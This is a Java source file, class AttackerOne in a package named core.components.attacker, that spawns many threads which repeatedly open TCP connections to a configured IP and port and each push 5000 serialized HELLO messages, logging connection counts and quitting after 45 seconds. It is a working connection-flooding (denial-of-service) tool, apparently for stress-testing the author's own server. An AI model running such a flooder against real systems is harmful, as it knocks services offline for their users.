/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package core.components.attacker;

import core.management.ByteArrayWrap;
import core.management.CoreProperties;
import core.management.Message;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;

/**
 *
 * @author miguel
 */
public class AttackerOne implements Runnable {

    public String ip;
    public int port;
    private Socket socket;
    private CoreProperties prop;
    public byte[] payload;
    private Random rand;
    int threads;
    Attack[] attack;
    ConnectionTask task;
    Timer timer2;
    Counter up, totalUp, totalDown;

    public AttackerOne(int threads) {
        this.ip = prop.ip;
        this.port = prop.destiny_port;
        this.payload = new byte[prop.payload];
        this.rand = new Random();
        rand.nextBytes(payload);
        this.threads = threads;
        this.up = new Counter();
        this.totalUp = new Counter();
        this.totalDown = new Counter();
        task = new ConnectionTask();
        timer2 = new Timer();
        timer2.schedule(task, 0, 1000); //delay in milliseconds

        attack = new Attack[threads];
        for (int j = 0; j < threads; j++) {
            attack[j] = new Attack();
        }
    }

    @Override
    public void run() {
        for (int j = 0; j < threads; j++) {
            new Thread(attack[j]).start();
        }
    }

    class ConnectionTask extends TimerTask {

        int secs = 0;

        ConnectionTask() {

        }

        @Override
        public void run() {
            System.out.println("Connections=" + up + " total up=" + totalUp + " total down=" + totalDown + " elapsed=" + secs++);
            if(secs==45){
                System.exit(0);
            }

        }

    }

    class Attack implements Runnable {

        public Attack() {

        }

        @Override
        public void run() {
            byte[] arr = new byte[100];
            Message send = new Message(Message.HELLO, 100, 10, arr);
            Socket socket = null;
            DataOutputStream out = null;

            byte[] serl = new byte[120];
            ByteBuffer serialized = ByteBuffer.allocate(100+20).order(ByteOrder.BIG_ENDIAN);
            int numbytes = send.serialize(serl, serialized);
            ByteArrayWrap b = new ByteArrayWrap(serl, (numbytes));

            while (true) {
                try {
                    socket = new Socket(CoreProperties.ip, CoreProperties.destiny_port);
                    out = new DataOutputStream(socket.getOutputStream());
                    up.incrementeCounter();
                    totalUp.incrementeCounter();
                    int k = 0;
                    while (k < 5000) {
                        out.writeInt(b.getSize());
                        out.write(b.getArr(), 0, b.getSize());
                        out.flush();
                        k++;
                    }
                    if (socket != null) {
                        if (out != null) {
                            out.close();
                        }
                        socket.close();
                        up.decrementCounter();
                        totalDown.incrementeCounter();
                    }
                } catch (Exception ex) {
                    System.out.println("Execption::: " + ex.getMessage());
                    new Attack();
                }
            }
        }

    }

}
